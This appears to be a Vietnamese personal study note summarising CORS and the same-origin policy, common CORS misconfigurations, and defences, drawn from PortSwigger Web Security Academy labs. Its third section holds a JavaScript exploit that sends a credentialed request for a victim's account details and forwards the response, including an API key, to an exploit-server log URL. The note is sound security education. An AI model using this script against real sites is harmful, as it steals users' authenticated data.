# Lý thuyết CORS - mình tổng hợp lại

-sau khi học phần này, mình hiểu là: SOP cấm site A đọc response của site B. CORS là cơ chế server "nới" SOP bằng header `Access-Control-Allow-Origin`. Nới ẩu là toang.
-chi tiết SOP/CORS mình vẽ ở [[0-map CORS]], [[vai trò của CORS và tác động tới SOP]], còn file này mình tổng hợp ngắn để tra nhanh.

## 1. CORS hoạt động thế nào
- [ ] browser gửi request kèm `Origin: https://a.com`
- [ ] server check rồi trả về `Access-Control-Allow-Origin: https://a.com` (+ `Access-Control-Allow-Credentials: true` nếu cho gửi cookie)
- [ ] browser thấy origin mình nằm trong whitelist thì cho JS đọc response. Không có header này thì gửi được nhưng không đọc được.
- [ ] request "phức tạp" (PUT/JSON/custom header) thì browser gửi preflight `OPTIONS` trước.

## 2. Các lỗi mình hay gặp
- [ ] reflect bừa: server echo lại đúng `Origin` mình gửi + `Credentials: true`. -> bài basic, ai cũng đọc được dữ liệu victim.
- [ ] trust `null`: whitelist có `null`. Mình dùng `sandbox` iframe để tạo origin `null` rồi đọc ké. -> [[Lab-CORS null origin]]
- [ ] trust http: whitelist cho `http://*.site` trong khi site chính là https. Mình chiếm subdomain http (XSS) rồi đọc dữ liệu https. -> [[Lab-CORS insecure protocols]]
- [ ] pivot vào mạng nội bộ: dùng XSS ở subdomain public để bắt browser victim request vào server nội bộ + đọc response qua CORS. -> [[Lab-CORS internal pivot]]
- [ ] `*` + credentials: `*` thì browser cấm kèm credentials, nhưng nhiều lib vẫn set `*` chung với `true` -> lỗi.

## 3. Khai thác chuẩn của mình
```js
// file exploit trên exploit-server
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('GET', 'https://LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true; // gửi cookie victim theo
req.send();
function reqListener() { location = 'https://exploit-LAB.exploit-server.net/log?key=' + encodeURIComponent(this.responseText); }
```
- [ ] victim vào trang exploit -> JS gửi request kèm cookie victim -> response chứa API key bay về log của mình.

## 4. Phòng chống - mình tự nhắc
- [ ] không bao giờ reflect `Origin` bừa, whitelist cứng từng domain (so sánh host chuẩn, không `contains`).
- [ ] không whitelist `null`, không mix http/https.
- [ ] `Vary: Origin`, bỏ `Credentials` nếu không cần, dữ liệu nhạy cảm thì đừng dựa mỗi CORS.

> [!NOTE]
> -thứ tự lab mình đi ở file: [[0-index CORS]]
